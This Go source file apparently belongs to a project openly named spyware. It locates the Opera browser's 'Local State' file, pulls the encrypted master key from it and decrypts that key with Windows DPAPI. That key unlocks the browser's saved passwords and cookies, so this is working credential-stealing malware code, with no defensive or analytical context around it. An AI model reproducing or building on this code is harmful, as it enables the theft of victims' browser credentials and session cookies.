package opera

import (
	"encoding/base64"
	"os"
	"path/filepath"

		"github.com/Nevesto/spyware/crypto"
	"github.com/tidwall/gjson"
)

func getMasterKey(keyPath string) ([]byte, error) {
	key, err := os.ReadFile(keyPath)
	if err != nil {
		return nil, err
	}
	encryptedKey := gjson.Get(string(key), "os_crypt.encrypted_key").String()
	decodedKey, err := base64.StdEncoding.DecodeString(encryptedKey)
	if err != nil {
		return nil, err
	}
	trimmedKey := decodedKey[5:]
	decryptedKey, err := crypto.DPAPI(trimmedKey)
	if err != nil {
		return nil, err
	}
	return decryptedKey, nil
}

func GetMasterKeyPath() (string, error) {
	operaUserDataPath, err := GetOperaUserDataPath()
	if err != nil {
		return "", err
	}
	return filepath.Join(operaUserDataPath, "..", "Local State"), nil
}